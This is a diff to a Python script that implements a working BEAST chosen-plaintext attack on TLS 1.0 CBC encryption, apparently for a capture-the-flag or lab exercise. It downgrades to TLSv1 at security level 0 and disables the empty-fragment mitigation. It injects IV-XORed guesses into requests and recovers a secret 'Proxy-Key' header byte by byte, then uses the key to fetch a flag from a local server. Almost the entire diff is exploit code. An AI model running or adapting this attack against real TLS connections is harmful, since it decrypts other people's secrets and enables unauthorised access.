@@ -3,6 +3,18 @@ from socket import create_connection, create_server, AF_INET6
 from threading import Thread
 from struct import unpack
 from binascii import hexlify
+from ssl import SSLContext, PROTOCOL_TLSv1
+from Crypto.Util.strxor import strxor
+from collections import deque
+
+SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS = 2048
+
+
+def build_ssl_context():
+    tls = SSLContext(PROTOCOL_TLSv1)
+    tls.set_ciphers("ECDHE-RSA-AES128-SHA@SECLEVEL=0")
+    tls.options |= SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS
+    return tls
 
 
 def recvn(socket, n):
@@ -67,40 +79,114 @@ def run_sniffer(c2s, s2c, catcher, target):
             Thread(target=handle_client, args=(socket, address)).start()
 
 
-def show_data_packet(type, content):
+proxy = None
+endpoint = b"BBBBBBBBBBBBBBBBBB"
+ptx = b"/2\r\nProxy-Key: "
+alphabet = deque("ABCDEFGHIJKLMNOPQRSTUVWXYZ\r\n")
+request_complete = False
+expected = 16 * b"\0"
+secret = b""
+# prev_iv = None
+
+
+def handle_ciphertext(type, content):
+    global request_complete
+    global endpoint
+    global alphabet
+    global ptx
+    global expected
+    global secret
+    # global prev_iv
+
+    # Consider only data records
     if type != 0x17:
         return
 
-    # Argument `content` contains a 20 byte MAC at the end
-    print(hexlify(content))
+    content = content[:-20]
+
+    if request_complete:
+        if content[:16] == expected:
+            # Guess is correct
+            ptx = ptx[1:] + alphabet[0].encode()
+            secret += alphabet[0].encode()
+            endpoint = endpoint[:-1]
+
+            if secret.endswith(b"\r\n"):
+                proxy.close()
+                finish(secret)
+                return
+
+        alphabet.rotate(-1)
+
+        request_complete = False
+        proxy.sendall(b"GET /" + endpoint + b" HTTP/2\r\n")
+        return
+
+    print(
+        "\x1b[1mSecret:\x1b[0m \x1b[93m{}\x1b[0m ".format(
+            (secret.decode() + alphabet[0]).replace("\r", "\\r").replace("\n", "\\n")
+        ),
+        end="\r",
+    )
+
+    prev_iv = content[16:32]
+    iv = content[-16:]
+    guess = ptx + alphabet[0].encode()
+    expected = content[32:48]
+
+    payload = strxor(iv, strxor(prev_iv, guess))
+
+    request_complete = True
+    proxy.sendall(b"Idempotency-Key: " + payload + b"\r\n\r\n")
+
+
+def finish(secret):
+    tls = build_ssl_context()
+    socket = create_connection(("::1", 8080))
+    server = tls.wrap_socket(socket, server_hostname="beast.example")
+
+    server.sendall(b"GET /flag HTTP/2\r\nProxy-Key: " + secret + b"\r\n\r\n")
+    print("\x1b[1m{}\x1b[0m".format(server.recv(2**16)[:-4].decode()))
 
 
 def main():
-    try:
-        catcher_host = argv[1]
-        catcher_port = int(argv[2])
-        target_host = argv[3]
-        target_port = int(argv[4])
-    except (IndexError, ValueError):
-        print(
-            "Usage:",
-            argv[0],
-            "[CATCHER HOST] [CATCHER PORT] [TARGET HOST] [TARGET PORT]",
-        )
-        return
+    global proxy
+    global endpoint
+
+    #    try:
+    #        catcher_host = argv[1]
+    #        catcher_port = int(argv[2])
+    #        target_host = argv[3]
+    #        target_port = int(argv[4])
+    #    except (IndexError, ValueError):
+    #        print(
+    #            "Usage:",
+    #            argv[0],
+    #            "[CATCHER HOST] [CATCHER PORT] [TARGET HOST] [TARGET PORT]",
+    #        )
+    #        return
+
+    tls = build_ssl_context()
+    socket = create_connection(("::1", 8000))
+    proxy = tls.wrap_socket(socket, server_hostname="beast.example")
 
     sniffer = Thread(
         target=run_sniffer,
         args=(
-            show_data_packet,
+            handle_ciphertext,
             None,
-            (catcher_host, catcher_port),
-            (target_host, target_port),
+            ("::1", 1337),
+            ("::1", 8080),
         ),
     )
     sniffer.start()
+
+    proxy.sendall(b"GET /" + endpoint + b" HTTP/2\r\n")
+
     sniffer.join()
 
 
 if __name__ == "__main__":
     main()
+
+# split = lambda x: [ x[i:i+16] for i in range(0, len(x), 16)]
